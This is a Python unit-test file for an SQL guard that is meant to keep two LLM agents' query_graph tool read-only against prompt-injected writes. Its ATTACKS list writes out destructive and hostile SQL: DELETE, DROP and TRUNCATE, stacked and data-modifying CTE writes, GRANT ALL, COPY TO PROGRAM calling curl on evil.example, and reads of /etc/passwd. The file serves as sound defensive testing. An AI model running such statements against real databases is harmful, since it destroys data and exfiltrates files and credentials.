"""The read agents' ``query_graph`` tool must execute nothing but reads.

``search`` and ``advisor`` both expose ``query_graph(sql)``: the *model* writes
the SQL and the agent hands it to the RDS Data API verbatim, under a role that
can write. The guard is therefore a security boundary — the only one — between
a prompt injection sitting in an ingested document and ``DELETE FROM people``.

``_shared/test_sql_guard.py`` attacks the predicate. This file attacks the
shipped tools, because a guard is only worth what its call site does with it:
these tests assert that a rejected statement produces an error string AND that
``execute_statement`` was never reached. A test that only feeds valid SQL to a
guard proves nothing about the guard.

Both agents are covered by the same table, deliberately: they carried
copy-pasted copies of the check, so a fix applied to one and not the other is
exactly the drift worth catching.

Run:  cd agents/tests && ../../.venv-synth/bin/python -m unittest test_read_tool_guard
"""

from __future__ import annotations

import json
import sys
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent))

from agent_harness import FakeRds, load_agent  # noqa: E402

AGENTS = {
    "search": load_agent("search"),
    "advisor": load_agent("advisor"),
}


# Statements that must never reach Aurora, each paired with why it is dangerous.
ATTACKS = [
    ("bare delete", "DELETE FROM people"),
    ("bare update", "UPDATE people SET expertise_score = 1.0"),
    ("bare drop", "DROP TABLE people"),
    ("truncate", "TRUNCATE people CASCADE"),
    ("stacked statement",
     "SELECT 1; DELETE FROM people"),
    ("stacked statement, trailing semicolon",
     "SELECT 1; DELETE FROM people;"),
    ("stacked with whitespace and newlines",
     "SELECT name FROM people\n;\nDROP TABLE people"),
    # PostgreSQL executes a data-modifying CTE. This is one statement, it holds
    # no semicolon, and it starts with WITH — so the leading-keyword regex that
    # both agents used to carry ran it against the live graph.
    ("data-modifying CTE: delete",
     "WITH gone AS (DELETE FROM people RETURNING *) SELECT * FROM gone"),
    ("data-modifying CTE: update",
     "WITH b AS (UPDATE people SET expertise_score = 0 RETURNING id) "
     "SELECT count(*) FROM b"),
    ("data-modifying CTE: insert",
     "WITH a AS (INSERT INTO people (id, name) VALUES ('x', 'X') RETURNING id) "
     "SELECT * FROM a"),
    ("data-modifying CTE, mixed case and newlines",
     "with gone as (\n  delete from person_skills\n  returning *\n)\nselect * from gone"),
    # SELECT ... INTO is CREATE TABLE AS wearing a SELECT's clothes.
    ("select into", "SELECT * INTO exfil FROM people"),
    ("comment-prefixed write", "-- SELECT 1\nDELETE FROM people"),
    ("block-comment-prefixed write", "/* SELECT 1 */ DELETE FROM people"),
    ("grant", "GRANT ALL ON people TO PUBLIC"),
    ("copy to program", "COPY people TO PROGRAM 'curl https://evil.example'"),
    ("filesystem read", "SELECT pg_read_file('/etc/passwd')"),
    ("denial of service", "SELECT pg_sleep(600)"),
    ("sequence mutation", "SELECT nextval('people_id_seq')"),
    ("unterminated quote", "SELECT * FROM people WHERE name = 'oops"),
    ("empty", ""),
]

# Statements the tools must keep running — a guard that breaks the read path is
# just a broken tool.
LEGITIMATE = [
    ("simple select", "SELECT name FROM people LIMIT 10"),
    ("lowercase", "select name from people"),
    ("trailing semicolon", "SELECT name FROM people;"),
    ("read-only CTE",
     "WITH top AS (SELECT person_id FROM person_skills ORDER BY weight DESC LIMIT 5) "
     "SELECT p.name FROM top JOIN people p ON p.id = top.person_id"),
    ("write verb inside a literal",
     "SELECT id FROM people WHERE title = 'Update Manager'"),
    ("column names containing write verbs",
     "SELECT id, created_at, updated_at FROM people ORDER BY updated_at LIMIT 5 OFFSET 10"),
    ("subquery with EXISTS",
     "SELECT t.name FROM teams t WHERE NOT EXISTS ("
     "SELECT 1 FROM team_memberships tm WHERE tm.team_id = t.id)"),
]


class QueryGraphGuardTests(unittest.TestCase):
    def _run(self, agent_name, sql, rows=None):
        mod = AGENTS[agent_name]
        rds = FakeRds({"columnMetadata": [{"name": "name"}],
                       "records": rows if rows is not None else []})
        with mock.patch.object(mod, "_rds", rds):
            out = mod.query_graph(sql)
        return out, rds

    def test_every_attack_is_refused_without_touching_aurora(self):
        for agent_name in AGENTS:
            for label, sql in ATTACKS:
                with self.subTest(agent=agent_name, attack=label):
                    out, rds = self._run(agent_name, sql)
                    parsed = json.loads(out)
                    self.assertIn(
                        "error", parsed,
                        f"{agent_name} accepted {label!r}: {sql!r}",
                    )
                    self.assertEqual(
                        rds.calls, [],
                        f"{agent_name} sent {label!r} to Aurora",
                    )

    def test_the_rejection_names_the_rule_that_tripped(self):
        # The model reads this string and retries. "Only SELECT/WITH" alone
        # sends it in a circle when the statement already started with WITH.
        out, _ = self._run(
            "search",
            "WITH gone AS (DELETE FROM people RETURNING *) SELECT * FROM gone",
        )
        message = json.loads(out)["error"]
        self.assertIn("Only single read-only SELECT/WITH statements", message)
        self.assertIn("DELETE", message)

    def test_legitimate_queries_still_reach_aurora_unchanged(self):
        for agent_name in AGENTS:
            for label, sql in LEGITIMATE:
                with self.subTest(agent=agent_name, query=label):
                    _, rds = self._run(agent_name, sql)
                    self.assertEqual(len(rds.calls), 1, f"{agent_name} rejected {label!r}")
                    # Passed through verbatim — the guard vets, it never rewrites.
                    self.assertEqual(rds.calls[0]["sql"], sql)

    def test_results_are_requested_with_metadata_so_columns_can_be_named(self):
        _, rds = self._run("search", "SELECT name FROM people")
        self.assertIs(rds.calls[0]["includeResultMetadata"], True)

    def test_rows_are_keyed_by_column_name(self):
        out, _ = self._run(
            "search", "SELECT name FROM people", rows=[[{"stringValue": "Alice"}]]
        )
        self.assertEqual(json.loads(out), [{"name": "Alice"}])

    def test_both_agents_share_one_guard_implementation(self):
        # They used to carry copy-pasted regexes; a fix landing on one and not
        # the other is precisely the drift this asserts away.
        self.assertIs(
            AGENTS["search"].read_only_error, AGENTS["advisor"].read_only_error
        )


class RecordShapingTests(unittest.TestCase):
    def test_null_cells_become_none_not_the_boolean_true(self):
        # The Data API spells NULL as {"isNull": True}. Taking the first value
        # of that dict yields True, so a person with no expertise_score reached
        # the model as `"expertise_score": true` — a value it will reason about
        # rather than treat as missing.
        for name, mod in AGENTS.items():
            with self.subTest(agent=name):
                resp = {
                    "columnMetadata": [{"name": "name"}, {"name": "score"}],
                    "records": [[{"stringValue": "Alice"}, {"isNull": True}]],
                }
                self.assertEqual(
                    mod._records_to_dicts(resp), [{"name": "Alice", "score": None}]
                )

    def test_unnamed_columns_get_positional_keys(self):
        mod = AGENTS["search"]
        resp = {"columnMetadata": [{}], "records": [[{"longValue": 3}]]}
        self.assertEqual(mod._records_to_dicts(resp), [{"col0": 3}])

    def test_no_rows_is_an_empty_list_not_an_error(self):
        mod = AGENTS["advisor"]
        self.assertEqual(mod._records_to_dicts({"columnMetadata": [], "records": []}), [])


if __name__ == "__main__":
    unittest.main(verbosity=2)
